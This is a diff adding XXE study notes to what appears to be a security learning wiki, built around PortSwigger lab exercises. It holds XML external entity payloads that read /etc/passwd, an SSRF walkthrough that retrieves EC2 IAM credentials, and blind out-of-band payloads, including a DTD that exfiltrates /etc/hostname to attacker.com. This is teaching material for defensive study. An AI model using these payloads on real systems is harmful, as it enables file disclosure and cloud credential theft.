@@ -179,7 +179,122 @@ Both SYSTEM and PUBLIC are used to reference external entities, but the differen
 
 You can think of PUBLIC as being used for DTDs that are publicly available in online repositories and have a fixed identifier.
 
+## XXE to retrieve files
 
+Simplied use `SYSTEM` identifer and construct a malicious entity
+
+Lab from portswigger:
+
+<pre><code>&#x3C;?xml version="1.0" encoding="UTF-8"?>
+&#x3C;stockCheck>&#x3C;productId>
+<strong>1&#x3C;/productId>&#x3C;storeId>2&#x3C;/storeId>&#x3C;/stockCheck>
+</strong></code></pre>
+
+and we modifed the XML, added in the `SYSTEM` identifer to read files from `/etc/passwd`
+
+```
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE stockCheck [
+<!ENTITY xxe SYSTEM "file://etc/passwd">
+]>
+<stockCheck><productId>&xxe</productId><storeId>2</storeId></stockCheck>
+```
+
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+## XXE to SSRF
+
+XXE attacks is able to perform Server-side request forgery
+
+Lab from portswigger:
+
+{% code overflow="wrap" %}
+```
+ This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
+
+The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
+
+To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint. 
+```
+{% endcode %}
+
+First, identify the XXE area.
+
+In path `/product/stock`
+
+{% code overflow="wrap" %}
+```
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+```
+{% endcode %}
+
+Next our goal is to use XXE to extract potential data from the default EC2 endpoint
+
+{% embed url="https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/" %}
+
+Query to \`[http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/)\` Gives the roles admin
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+Embeded the rolename and we got the keys
+
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+## Blind XXE
+
+In many case, XXE vulnerabilities are blind, application does not return the values of any defined external entites in its response, direct retrieval of server-side files is not possible.
+
+This involve of using webhook or dnslogs, feel free to use the following sites or use burp collaborator instead
+
+{% embed url="https://webhook.site/#!/" %}
+
+{% embed url="http://dnslog.cn/" %}
+
+#### Blind XXE with DNS logs
+
+```
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
+```
+
+Similar to SSRF attacks, point to external entity.
+
+### Blind XXE with XML parameter entities
+
+Some of the XML parser might block regular entities or hardening. We can use parameter entites instead
+
+```
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
+```
+
+### Blind XXE with data exfiltrate
+
+To exfiltrate data out of band, it will be a little bit more works to do. The attacker have to host a malicious DTD on their server, and then invoke the external DTD within the XXE payload
+
+E.g. of malicious DTD to extract the contents of the `/etc/hostname`&#x20;
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#25; exfiltrate SYSTEM 'http://attacker.com/?file=%file;'>">
+%eval;
+%exfiltrate;
+```
+
+First line is to store the target files into the entity `file`
+
+Second line is to construct a dynamic entitiy that containing a dynamic declaration of another XML parameter entity called exfiltrate.
+
+&#x20;he exfiltrate entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the file entity within the URL query string.&#x20;
+
+Uses the eval entity, which causes the dynamic declaration of the exfiltrate entity to be performed.&#x20;
+
+Uses the exfiltrate entity, so that its value is evaluated by requesting the specified URL.
+
+In the XXE, we just perform normally to load the external DTD with parameter entites
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption><p>XML request</p></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption><p>Result</p></figcaption></figure>
 
 ## Interview Questions
 
@@ -188,4 +303,8 @@ You can think of PUBLIC as being used for DTDs that are publicly available in on
 2\) Other than DTD, what are some other type standard used with XML
 
 3\) Create a simple external DTD and reference from a file.
+
+4\) What is the core problem of XXE?
+
+5\) How to mitigate XXE
 
